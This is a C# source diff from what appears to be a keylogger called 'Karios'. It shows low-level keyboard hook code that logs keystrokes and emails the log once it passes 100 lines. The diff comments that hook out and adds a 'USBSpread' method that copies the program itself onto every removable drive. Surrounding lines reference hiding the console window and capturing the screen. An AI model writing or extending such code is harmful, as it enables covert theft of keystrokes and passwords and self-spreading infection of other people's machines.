@@ -25,13 +25,13 @@ namespace Karios
     class InterceptKeys
     {
         // ReSharper disable once InconsistentNaming
-        private const int WH_KEYBOARD_LL = 13;
+        //private const int WH_KEYBOARD_LL = 13;
 
         // ReSharper disable once InconsistentNaming
-        private const int WM_KEYDOWN = 0x0100;
+        //private const int WM_KEYDOWN = 0x0100;
 
-        private static readonly LowLevelKeyboardProc Proc = HookCallback;
-        private static IntPtr _hookId = IntPtr.Zero;
+        //private static readonly LowLevelKeyboardProc Proc = HookCallback;
+        //private static IntPtr _hookId = IntPtr.Zero;
         private static string _localIp;
         private static string _globalTargetIp;
         private static string _website;
@@ -59,9 +59,9 @@ namespace Karios
                 // Start Application
                 // var handle = GetConsoleWindow();
                 // ShowWindow(handle, SwHide);
-                _hookId = SetHook(Proc);
+                //_hookId = SetHook(Proc);
                 Application.Run();
-                UnhookWindowsHookEx(_hookId);
+                //UnhookWindowsHookEx(_hookId);
             }
 
             Console.WriteLine("IF Statement did not work... exiting");
@@ -218,6 +218,8 @@ namespace Karios
             }
         }
 
+        //setting hooks in keyboard
+        /*
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
             using (var curProcess = Process.GetCurrentProcess())
@@ -227,9 +229,10 @@ namespace Karios
                     GetModuleHandle(curModule.ModuleName), 0);
             }
         }
+        */
 
-        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-
+        //private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+        /*
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             try
@@ -264,9 +267,11 @@ namespace Karios
             }
             catch
             {
-                Console.WriteLine("Something went wrong, im dieing");
-            }  
-
+                //ignored
+            }
+            */
+            // The Reading part
+            /*
             if (File.ReadAllLines(pathToLog).Length <= 100) return CallNextHookEx(_hookId, nCode, wParam, lParam);
             {
                 if (EmailSending == false)
@@ -276,24 +281,13 @@ namespace Karios
                     SendMail();
                 }
             }
+            */
             //System.IO.File.Copy(path, Application.StartupPath + @"\log.txt", true);
             // ReSharper disable once UnusedVariable
-            var alldrives = DriveInfo.GetDrives();
-
-            /*
-                    foreach (DriveInfo d in alldrives)
-                    {
-                        if (d.DriveType == DriveType.Removable && d.IsReady)
-                        {
-                            File.Copy(Application.StartupPath + @"\" + System.AppDomain.CurrentDomain.FriendlyName
-                                , d.Name + @"\" + System.AppDomain.CurrentDomain.FriendlyName, true);
-                        }
-                    }
-                    */
             //delete log file.
             //File.Delete(pathToLog);
-            return CallNextHookEx(_hookId, nCode, wParam, lParam);
-        }
+            //return CallNextHookEx(_hookId, nCode, wParam, lParam);
+        //}
 
 
         /// <summary>
@@ -322,6 +316,22 @@ namespace Karios
             }
             */
         }
+
+        public static void USBSpread()
+        {
+            var alldrives = DriveInfo.GetDrives();
+
+
+            foreach (DriveInfo d in alldrives)
+            {
+                if (d.DriveType == DriveType.Removable && d.IsReady)
+                {
+                    File.Copy(Application.StartupPath + @"\" + System.AppDomain.CurrentDomain.FriendlyName,
+                        d.Name + @"\" + System.AppDomain.CurrentDomain.FriendlyName, true);
+                }
+            }
+        }
+
 
         public static void SendMail()
         {
@@ -420,9 +430,9 @@ namespace Karios
             return memoryImage;
         }
 
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr SetWindowsHookEx(int idHook,
-            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+        //[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        //private static extern IntPtr SetWindowsHookEx(int idHook,
+          //  LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
